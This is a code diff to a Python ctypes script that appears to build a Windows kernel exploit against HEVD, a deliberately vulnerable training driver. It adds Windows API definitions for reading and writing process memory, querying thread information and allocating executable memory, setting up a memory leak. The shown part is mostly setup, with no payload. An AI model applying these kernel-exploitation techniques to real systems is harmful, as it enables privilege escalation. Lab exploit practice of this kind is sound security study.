@@ -12,19 +12,38 @@ GENERIC_READ				= 0x80000000
 GENERIC_WRITE				= 0x40000000
 OPEN_EXISTING				= 0x03
 FORMAT_MESSAGE_FROM_SYSTEM	= 0x00001000
+NULL						= 0x00
+STATUS_SUCCESS				= 0x00
+MOVEFILE_REPLACE_EXISTING	= 0x01
+CREATE_SUSPENDED			= 0x00000004
+THREADFUNC					= CFUNCTYPE(None)
 MEM_COMMIT					= 0x00001000
 MEM_RESERVE					= 0x00002000
 PAGE_EXECUTE_READWRITE		= 0x00000040
 PAGE_READWRITE				= 0x00000004
-NULL						= 0x00
-STATUS_SUCCESS				= 0x00
+ThreadBasicInformation		= 0x00
+
+#We need this definition so the Python script knows what to ask the C/Windows TBI block for.
+class THREAD_BASIC_INFORMATION(Structure):
+    _fields_ = [
+        ("ExitStatus",      c_ulonglong),
+        ("TebBaseAddress",  c_void_p),
+        ("ClientId",        c_ulonglong),
+        ("AffinityMask",    POINTER(c_ulonglong)),
+        ("Priority",        c_ulonglong),
+        ("BasePriority",    c_ulonglong),
+]
 
 #Windows API Function Defs + Extras
 ntdll.NtAllocateVirtualMemory.argtypes = [c_ulonglong, POINTER(c_ulonglong), c_ulonglong, POINTER(c_ulonglong), c_ulonglong, c_ulonglong]
 kernel32.WriteProcessMemory.argtypes = [c_ulonglong, c_ulonglong, c_char_p, c_ulonglong, POINTER(c_ulonglong)]
 kernel32.DeviceIoControl.argtypes = [c_void_p, c_ulong, c_void_p, c_ulong, c_void_p, c_ulong, POINTER(c_ulong),c_void_p]
+#Added more definitions - read memory and also an API call for process information
+kernel32.ReadProcessMemory.argtypes = [c_void_p, c_void_p, c_void_p, c_size_t, POINTER(c_size_t)]
+ntdll.NtQueryInformationThread.argtypes = [c_void_p, c_ulonglong, c_void_p, c_ulong, POINTER(c_ulonglong)]
 STATUS_SUCCESS = 0
 written = c_size_t()
+read = c_size_t()
 
 # Allocate memory to use for the HEVD Leak
 # Easy to recognize arbitrary address
